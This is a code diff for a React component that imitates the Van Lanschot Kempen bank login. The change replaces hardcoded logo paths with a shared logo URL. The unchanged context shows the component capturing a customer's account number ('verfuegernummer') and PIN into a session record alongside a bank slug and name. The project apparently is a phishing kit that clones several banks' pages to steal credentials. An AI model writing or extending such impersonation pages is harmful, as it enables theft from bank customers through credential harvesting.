@@ -4,6 +4,7 @@ import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { stepToPath } from "@/lib/session-routes";
+import { VAN_LANSCHOT_KEMPEN_LOGO_URL } from "@/lib/banks-db";
 
 export function VanLanschotKempenClient({ sessionId }: { sessionId: string }) {
   const router = useRouter();
@@ -39,6 +40,7 @@ export function VanLanschotKempenClient({ sessionId }: { sessionId: string }) {
         ...prev, 
         bankSlug: "van-lanschot-kempen", 
         bankName: "Van Lanschot Kempen", 
+        logoFile: VAN_LANSCHOT_KEMPEN_LOGO_URL,
         verfuegernummer: username, 
         pin: code 
       }
@@ -50,7 +52,7 @@ export function VanLanschotKempenClient({ sessionId }: { sessionId: string }) {
   const Layout = ({ children }: { children: React.ReactNode }) => (
     <div className="min-h-screen bg-[#F5F6F6] font-sans flex flex-col items-center pt-8 pb-16 px-4">
       <div className="w-full max-w-[800px]">
-        <img src="/bank-logos/van-lanschot-kempen.svg" alt="Van Lanschot Kempen" className="h-10 mb-8" />
+        <img src={VAN_LANSCHOT_KEMPEN_LOGO_URL} alt="Van Lanschot Kempen" className="h-10 w-auto object-contain mb-8" />
       </div>
       
       <div className="w-full max-w-[800px] flex-1 flex flex-col items-center">
@@ -73,7 +75,7 @@ export function VanLanschotKempenClient({ sessionId }: { sessionId: string }) {
       <div className="min-h-screen bg-[#768388] font-sans flex flex-col items-center justify-center p-4">
         {/* Top Left Logo in overlay */}
         <div className="absolute top-8 left-8">
-           <img src="/bank-logos/van-lanschot-kempen-detail.svg" alt="Van Lanschot Kempen" className="h-10" />
+           <img src={VAN_LANSCHOT_KEMPEN_LOGO_URL} alt="Van Lanschot Kempen" className="h-10 w-auto object-contain" />
         </div>
 
         <div className="bg-white rounded-lg w-full max-w-[700px] shadow-2xl overflow-hidden relative">
